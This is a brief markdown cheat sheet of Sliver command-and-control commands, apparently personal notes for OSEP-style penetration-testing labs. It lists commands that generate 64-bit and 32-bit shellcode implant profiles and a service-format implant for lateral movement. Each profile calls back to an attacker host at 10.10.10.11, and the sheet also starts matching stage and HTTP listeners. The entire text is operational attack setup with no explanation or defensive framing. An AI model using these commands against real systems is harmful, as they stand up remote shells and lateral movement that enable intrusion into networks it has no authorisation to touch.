# Sliver Listeners

### 1) 64 bit shell

    profiles new --http 10.10.10.11:8088 --format shellcode osep
    stage-listener --url tcp://10.10.10.11:4443 --profile osep
    http -L 10.10.10.11 --lport 8088

### 2) 32 bit shell

    profiles new --http 10.10.10.11:9090 --format shellcode -a x86 osepx86
    stage-listener --url tcp://10.10.10.11:5553 --profile osepx86
    http -L 10.10.10.11 --lport 9090

### 3) Lateral Movement

    profiles new --http 10.10.10.11:8099 --format service osep-lateral
    http -L 10.10.10.11 --lport 8099
